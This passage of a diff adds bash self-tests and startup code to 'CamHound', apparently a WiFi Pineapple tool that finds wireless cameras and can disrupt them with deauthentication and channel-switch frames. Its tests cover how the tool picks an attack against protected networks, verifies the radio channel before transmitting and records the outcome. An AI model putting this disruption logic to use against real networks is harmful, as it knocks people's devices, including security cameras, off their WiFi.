+  # (measured 2026-11-05), so for the firmware command stderr is the only signal and rc is worthless.
+  # pagerinj is the reverse: it prints its sent=/failed= summary to stderr ON SUCCESS, so rc is the
+  # only signal -- which the inj_ok case above covers. Nothing exercised the firmware half, so the
+  # `[ -z "$err" ]` guard could have been dropped in a refactor with every test still green.
+  # Falsified by: csa_issue returning 0 for a command that printed to stderr, on either sender.
+  PINEAPPLE_DEAUTH_CLIENT_CSA() { printf 'close - IO is pending on closed socket\n' >&2; return 0; }
+  CSA_INJECTOR=""; csa_issue >/dev/null 2>&1
+  st "csa issue: the firmware shape -- rc 0 WITH stderr -- is a failure, not a send" "$?" 1
+  st "csa issue: and that stderr reaches the caller as the reason" \
+    "$(printf '%s' "$CSA_ERR" | grep -c 'IO is pending')" "1"
+  PINEAPPLE_DEAUTH_CLIENT_CSA() { return 0; }
+  CSA_INJECTOR=""; csa_issue >/dev/null 2>&1
+  st "csa issue: rc 0 with a silent firmware command is a send"  "$?" 0
+  # The picker label must follow the sender. With an injector configured, "fw-broken" is a lie.
+  CSA_INJECTOR="$tmp/inj_ok"
+  st "expect: with an injector, CSA is not fw-broken"  "$(posture_expect 'D+C' CSA)"  "injector"
+  st "expect: with an injector, BOTH names both legs"  "$(posture_expect 'D+C' BOTH)" "deauth+csa"
+  st "expect: an injector does not override NOINJ"     "$(posture_expect NOINJ CSA)"  "blocked"
+  st "expect: nor beacon protection"                   "$(posture_expect NONE BOTH)"  "blocked"
+  CSA_INJECTOR="$tmp/not_installed"
+  st "expect: a configured but absent injector is still fw-broken" "$(posture_expect 'D+C' CSA)" "fw-broken"
+  CSA_INJECTOR=""
   st "cmd unknown is empty" "$(response_cmd WAT)" ""
-  st "opts no PMF prefers BOTH"   "$(posture_opts 'D+C')"  "BOTH DEAUTH CSA"
-  st "opts PMF required leads CSA" "$(posture_opts C)"     "CSA BOTH DEAUTH"
+  st "opts no PMF leads DEAUTH"    "$(posture_opts 'D+C')" "DEAUTH BOTH CSA"
+  st "opts PMF required leads DEAUTH" "$(posture_opts C)"  "DEAUTH BOTH CSA"
   st "opts beacon prot offers none" "$(posture_opts NONE)" ""
   st "opts no-inject offers none"  "$(posture_opts NOINJ)" ""
-  st "opts unread leads CSA"       "$(posture_opts '?')"   "CSA BOTH DEAUTH"
+  st "opts unread leads DEAUTH"    "$(posture_opts '?')"   "DEAUTH BOTH CSA"
 
   # The shipped default is recon+response. A silent revert to 0 would disarm the rung with no
   # other symptom, so pin it here rather than trusting the config block to stay put.
@@ -2923,7 +3643,15 @@ IWFIX
   st "expect deauth vs no PMF"     "$(posture_expect 'D+C' DEAUTH)"  "works"
   st "expect deauth vs optional PMF" "$(posture_expect 'D?+C' DEAUTH)" "partial"
   st "expect deauth vs required PMF" "$(posture_expect C DEAUTH)"    "blocked"
-  st "expect csa vs required PMF"  "$(posture_expect C CSA)"         "works"
+  # CSA and BOTH cannot transmit on 1.1.3 at all (pineapd throws on a missing 'sta' before the
+  # opcode dispatch), so the badge never speaks for them -- except where the radio or the crypto
+  # rules them out first, which stays the stronger answer.
+  st "expect csa is fw-broken"     "$(posture_expect C CSA)"         "fw-broken"
+  # BOTH is the opcode-400 deauth plus a CSA leg that cannot land, so the badge governs the half
+  # that can; only CSA-alone is flatly fw-broken.
+  st "expect both is deauth only"  "$(posture_expect 'D+C' BOTH)"    "deauth only"
+  st "expect both vs required PMF" "$(posture_expect C BOTH)"        "blocked"
+  st "expect csa on NOINJ is still blocked" "$(posture_expect NOINJ BOTH)" "blocked"
   st "expect csa vs beacon prot"   "$(posture_expect NONE CSA)"      "blocked"
   st "expect both vs beacon prot"  "$(posture_expect NONE BOTH)"     "blocked"
   st "expect anything on NOINJ"    "$(posture_expect NOINJ CSA)"     "blocked"
@@ -2984,9 +3712,85 @@ IWFIX
   st "verdict absent, no baseline, seen after" "$(resp_verdict - - 10 20 1)" "INCONCLUSIVE"
   st "verdict no follow-up"     "$(resp_verdict 100 50 - - 1)"     "INCONCLUSIVE"
   st "verdict non-numeric"      "$(resp_verdict x 50 y 60 1)"      "INCONCLUSIVE"
+  # child_del on a file whose only line IS the pid: grep -v -x selects nothing and exits 1, so the
+  # old `&& mv` never ran and the pid stayed registered. kill_children then SIGTERMed and SIGKILLed
+  # a pid the kernel may have recycled, on a device whose neighbours are pineapd and the Go UI.
+  st_cf="$CHILD_FILE"; CHILD_FILE="$tmp/children"
+  printf '4242\n' >"$CHILD_FILE"; child_del 4242
+  st "child_del: removes the pid when it is the file's only line" "$(cat "$CHILD_FILE")" ""
+  printf '4242\n999\n' >"$CHILD_FILE"; child_del 4242
+  st "child_del: and still removes one of several"                "$(cat "$CHILD_FILE")" "999"
+  CHILD_FILE="$st_cf"
   POSTURE[aa:00:00:00:00:10]=C; POSTURE_TS[aa:00:00:00:00:10]=$EPOCHSECONDS
+  # cur_channel must not depend on iwinfo alone: it is a declared dependency that the measured
+  # device inventory does not list, and without the iw fallback lock_target failed OPEN and wrote
+  # lock=ok for a lock it never verified.
+  iwinfo() { :; }; iw() { echo 'channel 52 (5260 MHz), width: 20 MHz'; }
+  st "cur_channel: falls back to iw when iwinfo says nothing" "$(cur_channel)" "52"
+  iwinfo() { echo "          Channel: 11 (2.462 GHz)"; }
+  st "cur_channel: prefers iwinfo when it answers"            "$(cur_channel)" "11"
+  iwinfo() { :; }; iw() { :; }
+  PINEAPPLE_EXAMINE_BSSID() { :; }; PINEAPPLE_EXAMINE_CHANNEL() { :; }
+  lock_target aa:00:00:00:00:10 5 6 >/dev/null
+  st "lock_target: no read-back is rc 3, not a verified lock"  "$?" 3
+  st "lock_target: and it says the lock is unverified" "$(printf '%s' "$LOCK_TEXT" | grep -c unverified)" "1"
+  # A transient unreadable sample is not a different channel. Measured on the bench 2026-11-09:
+  # cur_channel returned empty, then 1, then 1, against a target channel of 1 -- the radio WAS
+  # parked where it was asked to be -- and the all-three-equal test scored that "still hopping
+  # (/1/1)", returned 2 and refused the whole response (loot row LOCK_FAILED on 50:92:6a:ae:a8:82).
+  # The counter lives in a file because cur_channel runs iwinfo inside $( ), so a variable
+  # incremented in the stub would die with the subshell and every sample would read the same.
+  : >"$tmp/chseq"
+  iwinfo() { printf 'x' >>"$tmp/chseq"; [ "$(wc -c <"$tmp/chseq" | tr -d ' ')" -gt 1 ] && printf '          Channel: 1 (2.412 GHz)\n'; return 0; }
+  lock_target aa:00:00:00:00:10 5 1 >/dev/null
+  st "lock_target: an empty first sample is not 'still hopping'" "$?" 0
+  # MIDDLE sample unreadable. This is the one empty pattern that behaves identically under either
+  # backfill order, so the mutation test has no teeth on it -- which is exactly why it needs a case
+  # of its own. CLAUDE.md claimed this was covered before 2026-11-10; it was not.
+  : >"$tmp/chseq"
+  iwinfo() { printf 'x' >>"$tmp/chseq"; [ "$(wc -c <"$tmp/chseq" | tr -d ' ')" != 2 ] && printf '          Channel: 1 (2.412 GHz)\n'; return 0; }
+  lock_target aa:00:00:00:00:10 5 1 >/dev/null
+  st "lock_target: a MIDDLE empty sample is not 'still hopping'" "$?" 0
+  # TWO unreadable samples leave exactly ONE reading, and one reading cannot establish that the
+  # radio is parked: the backfill turns the comparison into c3 = c3 = c3, a tautology. This used to
+  # return 0 and write lock=ok -- more confidence from less evidence than the two-good-samples case
+  # four lines up, which returns 3. rc 3 proceeds, so the 2026-11-09 fix is intact; only the label
+  # is honest now. Falsified by: this returning 0, or returning 2 (a refusal, the original bug).
+  : >"$tmp/chseq"
+  iwinfo() { printf 'x' >>"$tmp/chseq"; [ "$(wc -c <"$tmp/chseq" | tr -d ' ')" -gt 2 ] && printf '          Channel: 1 (2.412 GHz)\n'; return 0; }
+  lock_target aa:00:00:00:00:10 5 1 >/dev/null
+  st "lock_target: ONE readable sample is unverified, not a verified lock" "$?" 3
+  st "lock_target: and it is still not scored as hopping" \
+    "$(printf '%s' "$LOCK_TEXT" | grep -c 'hopping')" "0"
+  # The FOURTH read-back, after EXAMINE_CHANNEL. Protected by neither the 2026-11-09 nor the
+  # 2026-11-10 repair: a transient empty here scored "ch  != 1, lock failed" -- rc 2, refusing the
+  # whole response and transmitting nothing, with the same empty-field signature as the original bug.
+  : >"$tmp/chseq"
+  iwinfo() { printf 'x' >>"$tmp/chseq"; [ "$(wc -c <"$tmp/chseq" | tr -d ' ')" -lt 4 ] && printf '          Channel: 6 (2.437 GHz)\n'; return 0; }
+  lock_target aa:00:00:00:00:10 5 1 >/dev/null
+  st "lock_target: an empty FOURTH read is unverified, not a failed lock" "$?" 3
+  # The hopping log line must show the RAW samples. The 2026-11-09 defect was found only because
+  # "(/1/1)" made the empty slot visible; printing the backfilled values hid it and reported a
+  # sample that was never read.
+  : >"$tmp/chseq"
+  iwinfo() { printf 'x' >>"$tmp/chseq"; case "$(wc -c <"$tmp/chseq" | tr -d ' ')" in 2) printf '          Channel: 6 (2.437 GHz)\n' ;; 3) printf '          Channel: 11 (2.462 GHz)\n' ;; esac; return 0; }
+  lock_target aa:00:00:00:00:10 5 1 >/dev/null
+  st "lock_target: a genuinely hopping radio is still a failed lock" "$?" 2
+  st "lock_target: and the log shows the unread sample as _, not a backfilled value" \
+    "$(printf '%s' "$LOCK_TEXT" | grep -c '_/6/11')" "1"
+  : >"$tmp/chseq"
+  iwinfo() { printf 'x' >>"$tmp/chseq"; printf '          Channel: %s (2.412 GHz)\n' "$(wc -c <"$tmp/chseq" | tr -d ' ')"; }
+  lock_target aa:00:00:00:00:10 5 1 >/dev/null
+  st "lock_target: samples that really differ are still a failed lock" "$?" 2
+  iwinfo() { :; }
+  unset -f iwinfo iw; PINEAPPLE_EXAMINE_BSSID() { :; }; PINEAPPLE_EXAMINE_CHANNEL() { :; }   # restore the base stubs; unsetting them would expose the real ones
   st "disrupt row shows cached badge" "$(disrupt_row aa:00:00:00:00:10)" "Disrupt [C]"
-  st "disrupt row bare when uncached" "$(disrupt_row aa:00:00:00:00:13)" "Disrupt"
+  # :13 is the CH=0 fixture the line above asserts resp_target refuses. It used to render a plain
+  # inviting "Disrupt" that dead-ends: the refusal is logged to the pane BEHIND the card, so the
+  # card redraws unchanged and the button looks broken. The row now says which reason applies.
+  st "disrupt row says no channel, not a dead Disrupt" "$(disrupt_row aa:00:00:00:00:13)" "Disrupt n/a (no channel)"
+  st_device aa:00:00:00:00:14 cli "Wyze Labs Inc" "" 0 -; CH[aa:00:00:00:00:14]=6; BAND[aa:00:00:00:00:14]=2
+  st "disrupt row says not associated on an unassociated client" "$(disrupt_row aa:00:00:00:00:14)" "Disrupt n/a (not associated)"
   R_BSSID=aa:00:00:00:00:10; R_TARGET=ff:ff:ff:ff:ff:ff; R_CH=6; R_BAND=2
   POSTURE_RSN=cc00; POSTURE_EXT=-; rm -f "$tmp/responses.tsv"
   resp_write aa:00:00:00:00:10 C CSA PINEAPPLE_DEAUTH_CLIENT_CSA ok 10 10 MOVED
@@ -3009,6 +3813,12 @@ IWFIX
   st "aggregate: any still active"   "$(resp_aggregate 1 1 0)" "NO_EFFECT"
   st "aggregate: mixed"              "$(resp_aggregate 1 0 1)" "INCONCLUSIVE"
   st "aggregate: nothing measured"   "$(resp_aggregate 0 0 0)" "INCONCLUSIVE"
+  # CMD_REFUSED is deliberately outside the measurement vocabulary: a command the firmware refused
+  # transmitted nothing, so it must never be summarised as MOVED or NO_EFFECT. resp_aggregate only
+  # ever counts measured subjects, so it can never produce it -- pin that.
+  st "aggregate: never invents CMD_REFUSED" "$(resp_aggregate 1 1 1 | grep -c CMD_REFUSED)" "0"
+  rm -f "$tmp/responses.tsv"; resp_write aa:00:00:00:00:10 C CSA PINEAPPLE_DEAUTH_CLIENT_CSA ok 10 - CMD_REFUSED
+  st "response row: a refusal is recorded as CMD_REFUSED" "$(sed -n 2p "$tmp/responses.tsv" | awk -F'|' '{print $NF}')" "CMD_REFUSED"
   rm -f "$tmp/responses.tsv"; resp_write aa:00:00:00:00:10 C CSA PINEAPPLE_DEAUTH_CLIENT_CSA ok 10 10 MOVED aa:00:00:00:00:11
   st "response row: measured target override" "$(sed -n 2p "$tmp/responses.tsv" | cut -d'|' -f5)" "aa:00:00:00:00:11"
   # resp_snapshot picks subjects by the attack's scope, not by the picked row. A client-row CSA/BOTH
@@ -3186,7 +3996,7 @@ IWFIX
   unset -f pidof; st "bands apply: a pineapd restart is reported even when the write is not trusted" "$(grep -c 'pineapd restarted by the band write' "$tmp/events.log")" "1"
   st "bands apply: an issued write is remembered on disk even when untrusted" "$BANDS_WROTE:$(cut -d' ' -f1 "$BANDS_STATE")" "2,5:2,5"
   bands_restore; st "bands restore: an untrusted write is restored anyway, record gone" "$(sed -n 5p "$tmp/bands.log"):$BANDS_WROTE:$([ -e "$BANDS_STATE" ] && echo file || echo none)" "wlan9mon 2 5::none"
-  BANDS_ORIG=""; BANDS_WROTE=""; printf '2,5' >"$tmp/bands"; bands_apply; CONFIRMATION_DIALOG() { echo 1; }; settings_reset >/dev/null 2>&1; unset -f CONFIRMATION_DIALOG
+  BANDS_ORIG=""; BANDS_WROTE=""; printf '2,5' >"$tmp/bands"; bands_apply; CONFIRMATION_DIALOG() { echo 1; }; settings_reset >/dev/null 2>&1; CONFIRMATION_DIALOG() { return 1; }   # restore the declining stub, never unset it
   st "settings reset: BAND6 back at 0 restores an issued write" "$(sed -n 7p "$tmp/bands.log"):$BAND6:$BANDS_WROTE" "wlan9mon 2 5:0:"
   uci() { echo '2,5'; }; iw() { echo 'channel 37 (5975 MHz), width: 20 MHz'; }   # applied at runtime, uci untouched
   bands_apply; st "bands apply: a live 6 GHz channel is enough, uci lagging" "$BANDS_ORIG:$BANDS_LINE" "2,5:2,5,6"
@@ -3202,6 +4012,20 @@ IWFIX
   if command -v jq >/dev/null 2>&1; then
     st "cli jq: probe object -> probed SSIDs (wildcard dropped), association unknown" "$(printf '%s' "$cj" | jq -r "$JQ_CLI" | sed -n 1p)" "AA:BB:CC:00:00:01|-|12|-57|HomeNet,Cam_Net|2437|1700000000|0"
     st "cli jq: client with no probe object" "$(printf '%s' "$cj" | jq -r "$JQ_CLI" | sed -n 2p)" "AA:BB:CC:00:00:02|-|3|-70||5180|1700000002|0"
+    # Separator sanitisation without gsub. The device's jq has no Oniguruma, so gsub is undefined
+    # there and the whole program emitted nothing; split/1 is a literal split and needs no regex.
+    # All five separators in one SSID, so a reintroduced gsub or a missed character is caught here.
+    st "cli jq: every separator collapses without a regex" \
+       "$(printf '%s' '[{"mac":"aa","probe":{"1":{"ssid":"a|b;c,d"}}}]' | jq -r "$JQ_CLI")" \
+       "aa|-|0|-|a_b_c_d|0|0|0"
+    # A functional probe, not a presence probe. A jq that exists but cannot run our program must
+    # leave HAVE_JQ at 0 so the fallback parsers are used, rather than silently yielding no rows.
+    jq_works; st "jq probe: a working jq is accepted" "$?" 0
+    jq() { return 3; }
+    jq_works; st "jq probe: a jq that fails our program is refused" "$?" 1
+    jq() { printf 'unexpected\n'; }
+    jq_works; st "jq probe: a jq whose output is wrong is refused" "$?" 1
+    unset -f jq
   fi
   local dj='[{"beacon":{"3488417929":{"channel":1,"count":269148,"freq":2412,"hidden":false,"signal":-61,"ssid":"Lab AP","ssidlen":6,"time":1700000000}},"freq":2412,"mac":"AA:BB:CC:00:00:10","packets":325816,"probe":{"25061":{"channel":10,"count":3142,"freq":2457,"signal":-68,"ssid":"","ssidlen":0,"time":1700000000}},"response":{"5550":{"channel":1,"count":53526,"freq":2412,"signal":-63,"ssid":"Lab AP","ssidlen":6,"time":1700000000}},"signal":-61,"time":1700000000},{"freq":2437,"mac":"AA:BB:CC:00:00:01","packets":12,"probe":{"2918451234":{"channel":6,"count":3,"freq":2437,"signal":-55,"ssid":"HomeNet","ssidlen":7,"time":1700000005}},"signal":-57,"time":1700000000}]'
   if command -v jq >/dev/null 2>&1; then
@@ -3212,6 +4036,7 @@ IWFIX
   st "cli fallback via DEVICES: empty beacon/response objects are still a client; a response-only AP is not" "$(printf '%s' "$ej" | parse_cli_fallback | tr '\n' ' ')" "AA:BB:CC:00:00:02|-|5|-60|Net2|2437|1700000001|0 "
   st "cli fallback via DEVICES: same one row" "$(printf '%s' "$dj" | parse_cli_fallback | tr '\n' ' ')" "AA:BB:CC:00:00:01|-|12|-57|HomeNet|2437|1700000000|0 "
   st "cli fallback: same rows as jq from the same shape" "$(printf '%s' "$cj" | parse_cli_fallback | tr '\n' ' ')" "AA:BB:CC:00:00:01|-|12|-57|HomeNet,Cam_Net|2437|1700000000|0 AA:BB:CC:00:00:02|-|3|-70||5180|1700000002|0 "
+  st "stubs: still stubbed after the last case, so no teardown exposed a real command" "$(st_stubs_intact)" "none"
   # 8 marked blocks
   if command -v md5sum >/dev/null 2>&1 && [ -f "${BASH_SOURCE[0]}" ]; then
     printf 'lib block md5   %s\n' "$(sed -n '/^# --- camhound lib begin ---/,/^# --- camhound lib end ---/p' "${BASH_SOURCE[0]}" | md5sum | cut -c1-32)"
@@ -3254,6 +4079,15 @@ apply_mode
 cfg_snapshot_defaults
 load_overrides
 bands_recover; [ "$BAND6" = 1 ] && bands_apply
+# A fresh Recon session, so a run reports what is transmitting NOW rather than everything the
+# daemon has accumulated since boot. It also keeps the device count low, which matters because the
+# per-cycle cost scales with it. Side effect worth being loud about: this wipes the Recon session
+# for anything ELSE using it, so it is starred and can be turned off in Settings -> Recon.
+if [ "$RECON_FRESH" = 1 ] && command -v PINEAPPLE_RECON_NEW >/dev/null 2>&1; then
+  PINEAPPLE_RECON_NEW >/dev/null 2>&1
+  log recon "RECON_FRESH: new session requested at start (previous recon list discarded)"
+  ui_ok && LOG yellow "fresh Recon session: this run shows what is transmitting now"
+fi
 (( CFG_OVERRIDES > 0 )) && { LOG yellow "cfg: $CFG_OVERRIDES overrides"; log cfg "$CFG_NOTE"; }
 log run "start v$VERSION run=$RUN_ID sigs=$SIG_COUNT($SIG_SOURCE) jq=$HAVE_JQ tcpdump=$HAVE_TCPDUMP bands=${BANDS_LINE:-?} mode=$MODE loaded=$LOADED_ROWS dedupe_h=$DEDUPE_H"
 LOG "CamHound $VERSION [$MODE]"$'\n'"sigs: $SIG_COUNT ($SIG_SOURCE)$( [ "$HAVE_JQ" = 1 ] || printf ' no-jq')$( [ "$HAVE_TCPDUMP" = 1 ] || printf ' no-tcpdump')"$'\n'"bands: ${BANDS_LINE:-?}"$'\n'"prox: uncal"
